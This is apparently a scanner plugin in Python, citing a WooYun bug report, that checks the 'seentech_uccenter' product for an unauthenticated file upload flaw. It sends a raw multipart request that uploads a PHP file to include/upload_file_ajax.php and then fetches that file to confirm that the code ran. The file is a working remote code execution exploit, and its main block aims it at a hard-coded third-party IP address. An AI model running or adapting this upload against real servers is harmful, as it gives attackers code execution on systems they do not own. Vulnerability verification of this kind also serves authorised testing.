#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#link：http://wooyun.org/bugs/wooyun-2010-0108640

def assign(service, arg):
    if service == "seentech_uccenter":
        return True, arg

def audit(arg):
    raw = """POST /ucenter/include/upload_file_ajax.php HTTP/1.1
Host: 60.223.226.154
Connection: keep-alive
Content-Length: 353
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36
HTTPS: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjIEtCXPH57DBttu6
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=153d91c04992e4c54b7ff8f2f5414c63

------WebKitFormBoundaryjIEtCXPH57DBttu6
Content-Disposition: form-data; name="file"; filename="3.php"
Content-Type: application/x-php

<?php
echo md5('testvul');
unlink($GLOBALS['SCRIPT_FILENAME']);
?>
------WebKitFormBoundaryjIEtCXPH57DBttu6
Content-Disposition: form-data; name="fileframe"

aaaa
------WebKitFormBoundaryjIEtCXPH57DBttu6--
"""
    url1 = arg + 'include/upload_file_ajax.php'
    code, head,res, errcode, _ = curl.curl2(url1,raw=raw)
    url2 = arg + 'include/3.php'
    code, head,res, errcode, _ = curl.curl2(url2)
    if code == 200 and 'e87ebbaed6f97f26e222e030eddbad1c' in res:
        security_hole(url1)


if __name__ == '__main__':
    from dummy import *
    audit(assign('seentech_uccenter', 'http://220.165.220.62/ucenter/')[1])